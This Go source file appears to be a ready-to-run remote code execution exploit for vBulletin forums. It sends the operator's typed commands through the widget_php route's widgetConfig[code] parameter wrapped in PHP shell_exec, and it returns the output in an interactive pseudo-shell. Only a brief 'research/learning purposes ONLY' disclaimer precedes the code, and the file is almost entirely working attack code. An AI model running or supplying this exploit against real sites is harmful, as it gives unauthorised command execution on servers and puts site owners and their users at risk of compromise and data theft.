// @author Basebandit
//
// This is exploit is to be used for research/learning purposes ONLY
// Furthermore, the author Basebandit neither endorses nor is responsible
// for the accuracy,reliability and use of any piece of the code.
//
//

package main

import (
	"bufio"
	"context"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"
)

func main() {
	if len(os.Args) != 2 {
		fmt.Println(fmt.Sprintf("Usage: %s <URL to vBulletin>", os.Args[0]))
		os.Exit(1)
	}

	params := url.Values{"routestring": {"ajax/render/widget_php"}}
	client := &http.Client{
		Timeout: time.Second * 30,
	}

	c := make(chan os.Signal, 1)
	signal.Notify(c, syscall.SIGINT, syscall.SIGTERM)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go func() {
		for range c {
			fmt.Println(fmt.Sprintf("%s", "closing shell..."))
			os.Exit(0)
		}

		_, cancel := context.WithTimeout(ctx, 5*time.Second)
		defer cancel()
	}()

	for {
		reader := bufio.NewReader(os.Stdin)

		fmt.Print("vBulletin$ ")

		cmd, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(fmt.Sprintf("Error reading command %v", err.Error()))
			os.Exit(1)
		}
		params.Set("widgetConfig[code]", "echo shell_exec('"+cmd+"'); exit;")

		req, err := http.NewRequest("POST", os.Args[1], strings.NewReader(params.Encode()))
		if err != nil {
			fmt.Println(fmt.Sprintf("failed to post request: %v", err))
			os.Exit(1)
		}

		req.Header.Add("Content-type", "application/x-www-form-urlencoded")
		req.Header.Add("Content-length", strconv.Itoa(len(params.Encode())))

		resp, err := client.Do(req)
		if err != nil {
			fmt.Println(fmt.Sprintf("failed to send request: %v", err))
			os.Exit(1)
		}

		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println(fmt.Sprintf("failed to read response body: %v", err))
			os.Exit(1)
		}

		if resp.StatusCode == 200 {
			fmt.Print(string(body))
		} else {
			fmt.Println(fmt.Sprintf("%s", "Exploit failed! :("))
			os.Exit(1)
		}
	}
}
